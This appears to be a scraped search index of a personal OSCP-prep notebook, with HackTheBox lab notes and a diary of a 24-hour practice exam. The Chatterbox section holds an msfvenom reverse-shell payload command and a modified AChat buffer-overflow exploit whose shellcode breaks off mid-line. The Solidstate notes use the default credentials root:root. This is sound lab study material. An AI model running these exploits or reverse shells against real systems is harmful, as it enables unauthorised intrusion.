progress</code></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#recon","title":"Recon","text":"<p>The tags for this box </p> <ul> <li>File Misconfiguration</li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Medium</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#port-scan","title":"Port scan","text":"<pre><code>PORT     STATE SERVICE REASON         VERSION                                                                                                                                22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)                                                                                                                                                                25/tcp   open  smtp    syn-ack ttl 63 JAMES smtpd 2.3.2                                                                                                                      |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.3 [10.10.16.3])                                                                                                  80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))                                                                                                         | http-methods:                                                                                                                                                              |_  Supported Methods: HEAD GET POST OPTIONS                                                                                                                                 |_http-title: Home - Solid State Security                                                                                                                                    |_http-server-header: Apache/2.4.25 (Debian)                                                                                                                                 110/tcp  open  pop3    syn-ack ttl 63 JAMES pop3d 2.3.2                                                                                                                      119/tcp  open  nntp    syn-ack ttl 63 JAMES nntpd (posting ok)                                                                                                               4555/tcp open  rsip?   syn-ack ttl 63       \n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#services","title":"Services","text":"<p>The first thing I notice is JAMES. I've dealt with James in the OSCP lab and new what to look for.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#james","title":"JAMES","text":"<p>There's a remote admin tool running on port 4555. The default credentials <code>root:root</code> allow you to list all users and change their passwords if desired. I did this and started digging through mail.</p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#users","title":"Users","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#messages","title":"Messages","text":"<p>Mindy's acct must be locked down, but also a password might be sitting in her email!</p> <p></p> <p></p> <p></p> <p>The ability to log in with Mindy's account, along with EDB-50347 will give us a normal shell as the user Mindy (as apposed to the <code>rbash</code> session that's her default.)</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#enumeration","title":"Enumeration","text":""},{"location":"OSCP-Prep/HackTheBox/Work%20in%20Progress/Solidstate/#linpeas","title":"LinPEAS","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/","title":"General","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#day-1-the-exam","title":"Day 1  - The Exam","text":"<p>Official start time: <code>7:30am</code></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#740-am","title":"7:40 am","text":"<p>Today (2/3/2022) I took time off work to do an OSCP practice exam. The practice exam consists of the following:</p> <ul> <li> <p>3 Active Directory HTB challenges. If I root all three I earn 40 points. No partial points awarded.</p> </li> <li> <p>3 \"standard\" HTB challenges. 10 points granted for each flag. Each box has user and root flag. Can earn up to 60 points.</p> </li> </ul> <p>Last night I finished scanning all the boxes and haven't looked at any of the scan results yet.</p> <p>This morning I woke up feeling a little groggy. I probably shouldn't have stayed up programming till 1am :D</p> <p>Helped get the kids ready for daycare, and now I'm getting started at 7:43. The plan is to fully review and feel out potential exploits for all the boxes before trying to exploit any of them. Webserver enum will come last.</p> <p>For the sake of simplicity We'll say I started at 7:30am, so I have until 7:29am tomorrow to complete this.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#750-am","title":"7:50 am","text":"<p>Apparently I wasn't connected to VPN while scanning yesterday..... </p> <p>Adapt and overcome I guess :) - will start the morning by re-scanning each box. Going to have to pay attention to flow here and be sure to constantly be scanning something.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#815-am","title":"8:15 am","text":"<p>I went and had a fried egg sandwitch (dang eggs got over-done) and brew another cup of coffee while this first box is being re-scanned. This is a rough start so far, but I'm calm and not panicky. 24 hours should be plenty of time to do everything I can. Plus I'm wearing a black hoody, so everything will be ok, right?</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#9-am","title":"9 am","text":"<p>Just finished my first pomodoro break (5 mins). I did some stretching, meditated, and got more coffee. Back to hackin!</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#930-am","title":"9:30 am","text":"<p>Just finishing second break. I'm starting to get a bit nervous that the failure to scan everything last night will kill my chances at completing this all in 24 hours. Guess we'll have to wait and see. HOOD UP.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#950-am","title":"9:50 am","text":"<p>Just hit a bottleneck. Currently scanning box 3/6 with autorecon. It's still doing dirbuster and I'm hesitant to kill that. While the scan is running I've been prepping the documentation by filling out possible attack vectors for each box that has been scanned. I guess I could go back and look for public exploits (might be needed for initial foothold on some of these.)</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1003-am","title":"10:03 am","text":"<p>I've started my first long break (15 mins). Watching some funny Smosh videos on youtube to let my mind relax and forget about the chaos that's happening with this exam :)</p> <p>I was in the middle of collecting public exploits and felt like I could still going when break time came up. I started break to keep myself fresh; this is a marathon, not a sprint.</p> <p>Got up and moved around a bit to keep myself from getting chair fatigue.</p> <p>Looking at it....I'm actually doing pretty well for time. I'm almost 50% done with Recon in the first 2.5 hours (about 10% into the time limit)</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1019-am","title":"10:19 am","text":"<p>Break is over, I'm all caught up with enumeration up to the scan point. The only scan left is Dirbuster on Cronos (10.10.10.13). I'm going to kill it and hopefully not miss anything. Can always start it again later if I get stuck on this box.</p> <p>While the scan for the next box runs I'm going to take an early lunch.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1144-am","title":"11:44 am","text":"<p>Back from lunch. I even showered. If I fail this, I'm going to blame the lack of black hoody during exploit. Everyone knows you gotta look like this while you're hacking:</p> <p></p> <p>I ran into the bottleneck again. I'm going to let dirbuster run for about 30 mins and if NOTHING comes back in the 30 mins I think it's safe to abort.</p> <p>Alright, lets get back at it!</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1246-pm","title":"12:46 pm","text":"<p>Time for another long (15min) break! Making good progress. Documenting/Enumertion is right behind the scanner. Scanning 5/6 and enumerating 5/6.</p> <p>I'm excited and nervous to start the weaponization/exploitation phase of these attacks. The active directory boxes will be interesting - I'm thinking of saving them for last since it's all or none. I can at least get some points with the standard boxes. Then hopefully I'll have enough time to figure out the AD boxes with some research.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#125-pm","title":"1:25 pm","text":"<p>I ended up extending my break, the mental fatigue is starting to set in. I may need to take a nap or something after this session.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#135-pm","title":"1:35 pm","text":"<p>Started scan 6/6 - going to take a long break/nap and hopefully come back ready to exploit!</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#426-pm","title":"4:26 pm","text":"<p>I'm back to it. Had a good nap, ate some snacks. I'm not super excited to do this, but I'm ready.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#647-pm","title":"6:47 pm","text":"<p>Finally feel like I'm back in a groove. After my nap, the kids got home for the day, we had dinner together, and it took me a minute to get back into a flow state. Good to go now tho! May have to keep at it all night...approaching the 12 hour mark with no points yet :)</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#804-pm","title":"8:04 pm","text":"<p>Past the 12 hour mark. Still no points. I just used my metasploit attempt and it failed....gonna go take a break.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1032-pm","title":"10:32 pm","text":"<p>Time for another break. I got 10 points! YAY</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1100-pm","title":"11:00 pm","text":"<p>I'm back now, got some energy drinks and chips...Looks like tonight is going to be an all-nighter, havn't done this in a while.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1204-pm","title":"12:04 pm","text":"<p>2 monsters in, I've nearly exhausted all optoins for PE on the machine I got user on. Going to try one more thing then move on to the next machine. Break time (waiting for results from exploit suggester anyhow)</p> <p>Came back not even 10 mins later... back to windows PrivEsc :)</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1259-pm","title":"12:59 pm","text":"<p>Time for another break. The monsters are kicking in, good thing I didn't have any more.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#213-am","title":"2:13 am","text":"<p>Got another 10 points by getting <code>user</code> on cronos. So now I'm at 20! 20% of the way there with 5 hours left.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#250-am","title":"2:50 am","text":"<p>Got another 10 points by getting <code>root</code> on cronos. Total points now 30.</p> <p>Taking another break....and another Monster.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#310-am","title":"3:10 am","text":"<p>back to it....I'm getting really tired. This was wayyy easier in highschool :D</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#807-am","title":"8:07 am","text":"<p>Well, I crashed and just woke up. I feel ROUGH. No only did I fall asleep, but I wouldn't even have enough points to make the report worth it. I did lose quite a bit of time from the scanning fiasco...so I'm going to keep at it until 11am to see how I would have done without the lost time for re-scanning.</p> <p>But first, I need to recover.</p> <p></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#1103-am","title":"11:03 am","text":"<p>Well, it's official. My extended time is up and I haven't managed any more points. I'm still exhausted. I finished with 30 points, which means I would need to spend more money on a retake if this were the real exam.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/0.%20Intro/#lessons-learned","title":"Lessons Learned.","text":"<ul> <li>Validate your scanner is running before walking away. Don't assume it's working. You may not be connected to VPN.</li> <li>Pomodoro is helpful, but I need to be more disiplined on the length of breaks. During this test exam I started losing interest quickly. I'm not sure if I over-relaxed to avoid anxiety or what. It doesn't seem like burnout - today as the end got closer I got more and more pumped. Maybe I should be setting more rigorous SHORT TERM GOALS to keep me engaged. 24 hours is a long time to be engaged, and I felt myself having a procrastination mindset pretty early on.</li> <li>Get good sleep the night before. I saw this one online but ended up not following through.</li> <li>I have no idea what's going on with Active Directory</li> <li>Don't jump right in to credential stuffing; you could tip over the server. Also be sure to account for dynamic cookies; JUST USE BURP.</li> </ul> <p>That's it for now. I don't even have enough points to make the report worth while, so I'll finish up these boxes, add more to lessons learned, and then possibly do a report.</p> <p>Will need to study some AD hacking techniques.</p> <p>Then I suppose I should do another practice exam :)</p> <p>TTFN for now, guess I'll have to try harder &lt;- great tune</p> <p></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/","title":"10.10.10.182","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#port-scan","title":"Port scan","text":"<pre><code>PORT      STATE SERVICE       REASON          VERSION                                                                                                                        53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)                                                                 | dns-nsid:                                                                                                                                                                  |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)                                                                                                                          \n\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 14:15:04Z)                                                                 \n\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                  \n\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)                                 \n\n445/tcp   open  microsoft-ds? syn-ack ttl 127                                                                                                                                \n\n636/tcp   open  tcpwrapped    syn-ack ttl 127                                                                                                                                \n\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)                                 \n\n3269/tcp  open  tcpwrapped    syn-ack ttl 127                                                                                                                                \n\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        |_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                  |_http-title: Not Found                                                                                                                                                      \n\n49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\n49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\n49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                            \n\n49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\n49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        Device type: general purpose|phone|specialized                                                                                                                               Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)                                                                                               OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012                                                                                    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                            \n\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)   No exact OS matches for host (test conditions non-ideal)\n</code></pre> <p>This one appears to be one of the AD boxes (Kerberos is running on port 88).</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#enumerate-attack-surface","title":"Enumerate Attack Surface","text":"<p>From reviewing the port scan, we see the following structure start to emerge:</p> <p>This box definitely is AD related. - 88: Kerberos     - Maybe Kerberoast?     - Maybe MS14-068? - 389: LDAP     - Might be able to dump everything, or even write data with Manual Enumeration     - LDAP can be used without SSL - should sniff this  - 636: tcpwrapped (typically LDAPs) - 3268: LDAP (Global Catalog for LDAP) - 3269: tcpwrapped (Global catalog for LDAPs)</p> <p>dnsHostName: <code>CASC-DC1.cascade.local</code> ldapServiceName: <code>cascade.local:casc-dc1$@CASCADE.LOCAL</code>  serverName: <code>CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local</code></p> <p>Service Info:  - Host: <code>CASC-DC1</code> - OS: <code>Windows 2008 R2</code></p> <p>Definitely a domain controller, also DNS running: - 53: Microsoft DNS 6.1.7601 <code>(Windows Server 2008 R2 SP1)</code>     - Manual digging</p> <p>Also it appears to have a fileshare: - 139: Netbios-ssn     - Anonymous Login - 445: Microsoft-ds - RPC running on multiple ports</p> <p>And finally, a few HTTP servers: - 5985: Microsoft HTTPAPI httpd 2.0     - WinRM? check <code>_manual_commands.txt</code> - 49157: ncacn_http - RPC over HTTP 1.0</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#public-exploits","title":"Public Exploits","text":"<p>Maybe one of the Eternal exploits would work for Initial foothold? Would need to verify anon login for SMB first. Searchsploit agrees (based on Windows version reported by DNS)</p> <p></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#weaponization","title":"Weaponization","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#exploit-planning","title":"Exploit planning","text":"<ol> <li>Check SMB anon login<ul> <li>Nope</li> </ul> </li> <li>Check MS17-010 EDB-42031<ul> <li>Nope</li> </ul> </li> <li>Try LDAP manual enumeration (above)<ul> <li>Got some users, but nothing major.</li> </ul> </li> <li><code>WinRM</code>! Better dive into this.</li> </ol>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#privesc-planning","title":"PrivEsc Planning","text":"<ol> <li>Kerberoast</li> <li>Check MS16-032</li> </ol>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#exploit","title":"Exploit","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#eternal-blue","title":"Eternal Blue","text":"<p>Couldn't get EDB-42031 working - it's python 2 and my version of Kali is missing impacket for 2. Tried porting to 3, but I would have to go through and call out the byte strings. THIS NEEDS TO BE ADDRESSED BEFORE THE EXAM! I should probably use an older version of Kali which still has support for python2.</p> <p>So, I'll be using my ONE metsaploit for this one......SHIT</p> <p></p> <p>FML </p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#playing-with-ldap","title":"Playing with LDAP","text":"<p>I was able to dump everything from LDAP with this:</p> <pre><code>&gt;&gt;&gt; import ldap3\n&gt;&gt;&gt; server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)\n&gt;&gt;&gt; connection = ldap3.Connection(server)\n&gt;&gt;&gt; connection.bind()\nTrue\n&gt;&gt;&gt; server.info\n</code></pre> <pre><code>&gt;&gt; connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')\nTrue\n&gt;&gt;&gt; connection.entries\n</code></pre> <p></p> <p>I should also check if I can write data.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/1.%20Cascade/#winrm","title":"WinRM","text":"<p>Will follow this WinRM Hacking Guide</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/","title":"10.10.10.74","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#port-scan","title":"Port Scan","text":"<pre><code>PORT     STATE SERVICE REASON          VERSION                                                                                                                               \n\n9255/tcp open  http    syn-ack ttl 127 AChat chat system httpd                                                                                                               |_http-title: Site doesn't have a title.                                                                                                                                     | http-methods:                                                                                                                                                              |_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                 |_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE                                                                                                        \n\n9256/tcp open  achat   syn-ack ttl 127 AChat chat system                                                                                                                     \n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        Device type: general purpose|phone|specialized                                                                                                                               \n\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)                                                                                                 OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2                                                                             OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                            \n\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%) \n</code></pre> <p>Only 2 open ports. I guess the name <code>Chatterbox</code> is supposed to be a joke.</p> <p>Nothing really useful in the scan results. UDP ports are still being scanned, hopefully something comes up. Nothing came up. What on earth am I supposed to do with this box!?!?</p> <p>I feel like I'll need to rescan this one....or something.</p> <p>I reverted and re-scanned. Turns out the name <code>Chatterbox</code> is because this box is hosting AChat.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#public-exploits","title":"Public exploits","text":"<p>Using EDB-36025. Had to change line 57 to include the right IP address. </p> <p>Also need to swap out the payload - this POC just pops calc.exe </p> <p>Get new payload</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=444 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python\n\n</code></pre> <p>After changing out the payload, here's the completed exploit</p> <pre><code>#!/usr/bin/python                                                                                                                                                            # Author KAhara MAnhara                                                                                                                                                      # Achat 0.150 beta7 - Buffer Overflow                                                                                                                                        # Tested on Windows 7 32bit                                                                                                                                                                                                                                                                                                                               import socket                                                                                                                                                                import sys, time                                                                                                                                                                                                                                                                                                                                          buf =  b\"\"                                                                                                                                                                   buf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\"                                                                                                               buf += b\"\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\"                                                                                                               buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41\"                                                                                                               buf += b\"\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51\"                                                                                                               buf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31\"                                                                                                               buf += b\"\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41\"                                                                                                               buf += b\"\\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41\"                                                                                                               buf += b\"\\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\"                                                                                                               buf += b\"\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\"                                                                                                               buf += b\"\\x47\\x42\\x39\\x75\\x34\\x4a\\x42\\x4b\\x4c\\x77\\x78\\x44\\x42\"                                                                                                               buf += b\"\\x79\\x70\\x79\\x70\\x59\\x70\\x63\\x30\\x74\\x49\\x48\\x65\\x50\"                                                                                                               buf += b\"\\x31\\x39\\x30\\x50\\x64\\x34\\x4b\\x6e\\x70\\x6c\\x70\\x32\\x6b\"                                                                                                               buf += b\"\\x42\\x32\\x4c\\x4c\\x42\\x6b\\x70\\x52\\x4d\\x44\\x52\\x6b\\x53\"                                                                                                               buf += b\"\\x42\\x6c\\x68\\x4a\\x6f\\x48\\x37\\x4e\\x6a\\x6b\\x76\\x4d\\x61\"                                                                                                               buf += b\"\\x4b\\x4f\\x34\\x6c\\x6d\\x6c\\x73\\x31\\x61\\x6c\\x6a\\x62\\x6e\"                                                                                                               buf += b\"\\x4c\\x6b\\x70\\x57\\x51\\x36\\x6f\\x6c\\x4d\\x79\\x71\\x67\\x57\"                                                                                                               buf += b\"\\x38\\x62\\x4b\\x42\\x72\\x32\\x61\\x47\\x74\\x4b\\x61\\x42\\x6a\"                                                                                                               buf += b\"\\x70\\x74\\x4b\\x50\\x4a\\x4d\\x6c\\x52\\x6b\\x6e\\x6c\\x6e\\x31\"                                                                                                               buf += b\"\\x70\\x78\\x4b\\x33\\x4d\\x78\\x49\\x71\\x78\\x51\\x6f\\x61\\x62\"                                                                                                               buf += b\"\\x6b\\x52\\x39\\x6b\\x70\\x6b\\x51\\x37\\x63\\x32\\x6b\\x6f\\x59\"                                                                                                               buf += b\"\\x4b\\x68\\x69\\x53\\x4d\\x6a\\x6e\\x69\\x72\\x6b\\x30\\x34\\x52\"                                                                                                               buf += b\"\\x6b\\x6a\\x61\\x69\\x46\\x4c\\x71\\x59\\x6f\\x74\\x6c\\x67\\x51\"                                                                                                               buf += b\"\\x38\\x4f\\x4c\\x4d\\x7a\\x61\\x77\\x57\\x4d\\x68\\x57\\x70\\x34\"                                                                                                               buf += b\"\\x35\\x79\\x66\\x59\\x73\\x31\\x6d\\x78\\x78\\x4f\\x4b\\x31\\x6d\"                                                                                                               buf += b\"\\x6f\\x34\\x52\\x55\\x79\\x54\\x42\\x38\\x32\\x6b\\x30\\x58\\x6c\"                                                                                                               buf += b\"\\x64\\x6a\\x61\\x67\\x63\\x42\\x46\\x54\\x4b\\x4a\\x6c\\x4e\\x6b\"                                                                                                               buf += b\"\\x64\\x4b\\x72\\x38\\x6d\\x4c\\x7a\\x61\\x46\\x73\\x64\\x4b\\x59\"                                                                                                               buf += b\"\\x74\\x72\\x6b\\x6d\\x31\\x38\\x50\\x55\\x39\\x51\\x34\\x6c\\x64\"                                                                                                               buf += b\"\\x4d\\x54\\x6f\\x6b\\x6f\\x6b\\x51\\x51\\x52\\x39\\x6e\\x7a\\x72\"                                                                                                               buf += b\"\\x31\\x79\\x6f\\x47\\x70\\x61\\x4f\\x31\\x4f\\x61\\x4a\\x74\\x4b\"                                                                                                               buf += b\"\\x7a\\x72\\x7a\\x4b\\x44\\x4d\\x51\\x4d\\x53\\x38\\x6d\\x63\\x50\"                                                                                                               buf += b\"\\x32\\x59\\x70\\x59\\x70\\x52\\x48\\x63\\x47\\x31\\x63\\x30\\x32\"                                                                                                               buf += b\"\\x61\\x4f\\x52\\x34\\x30\\x68\\x6e\\x6c\\x71\\x67\\x6c\\x66\\x4d\"                                                                                                               buf += b\"\\x37\\x39\\x6f\\x36\\x75\\x55\\x68\\x74\\x50\\x59\\x71\\x59\\x70\"                                                                                                               buf += b\"\\x39\\x70\\x6e\\x49\\x49\\x34\\x62\\x34\\x4e\\x70\\x62\\x48\\x4d\"                                                                                                               buf += b\"\\x59\\x31\\x70\\x32\\x4b\\x6b\\x50\\x79\\x6f\\x56\\x75\\x32\\x30\"                                                                                                               buf += b\"\\x30\\x50\\x52\\x30\\x32\\x30\\x4f\\x50\\x52\\x30\\x4f\\x50\\x50\"                                                                                                               buf += b\"\\x50\\x31\\x58\\x69\\x5a\\x6c\\x4f\\x39\\x4f\\x4b\\x30\\x6b\\x4f\"                                                                                                               buf += b\"\\x6a\\x35\\x33\\x67\\x50\\x6a\\x6b\\x55\\x71\\x58\\x6a\\x6a\\x79\"                                                                                                               buf += b\"\\x7a\\x6e\\x30\\x4d\\x34\\x32\\x48\\x4c\\x42\\x4d\\x30\\x4d\\x31\"                                                                                                               buf += b\"\\x45\\x6c\\x34\\x49\\x58\\x66\\x62\\x4a\\x4a\\x70\\x6e\\x76\\x6f\"                                                                                                               buf += b\"\\x67\\x43\\x38\\x63\\x69\\x73\\x75\\x44\\x34\\x70\\x61\\x49\\x6f\"                                                                                                               buf += b\"\\x56\\x75\\x51\\x75\\x35\\x70\\x70\\x74\\x7a\\x6c\\x79\\x6f\\x4e\"                                                                                                               buf += b\"\\x6e\\x69\\x78\\x70\\x75\\x7a\\x4c\\x30\\x68\\x7a\\x50\\x48\\x35\"                                                                                                               buf += b\"\\x75\\x52\\x6e\\x76\\x6b\\x4f\\x77\\x65\\x52\\x48\\x71\\x53\\x50\"                                                                                                               buf += b\"\\x6d\\x30\\x64\\x59\\x70\\x51\\x79\\x59\\x53\\x42\\x37\\x4e\\x77\"                                                                                                               buf += b\"\\x62\\x37\\x70\\x31\\x4a\\x56\\x32\\x4a\\x4d\\x42\\x32\\x39\\x31\"                                                                                                               buf += b\"\\x46\\x38\\x62\\x39\\x6d\\x71\\x56\\x75\\x77\\x51\\x34\\x4d\\x54\"                                                                                                               buf += b\"\\x6d\\x6c\\x39\\x71\\x59\\x71\\x54\\x4d\\x71\\x34\\x6c\\x64\\x4c\"                                                                                                               buf += b\"\\x50\\x59\\x36\\x49\\x70\\x51\\x34\\x62\\x34\\x72\\x30\\x70\\x56\"                                                                                                               buf += b\"\\x6f\\x66\\x32\\x36\\x31\\x36\\x42\\x36\\x50\\x4e\\x50\\x56\\x4f\"                                                                                                               buf += 